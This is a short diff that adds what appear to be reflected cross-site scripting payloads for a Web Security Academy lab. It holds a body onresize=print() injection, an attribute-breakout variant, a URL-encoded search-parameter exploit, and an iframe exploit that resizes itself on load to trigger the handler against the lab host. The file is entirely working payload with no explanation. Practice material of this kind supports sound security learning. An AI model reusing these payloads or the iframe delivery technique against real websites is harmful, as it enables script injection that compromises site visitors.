@@ -1,0 +1,11 @@
+
+
+
+
+<body onresize="print()">
+"><body onresize=print()>
+
+
+https://0a1600410449f8a28030358100be0004.web-security-academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E
+
+<iframe src="https://0a1600410449f8a28030358100be0004.web-security-academy.net//?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
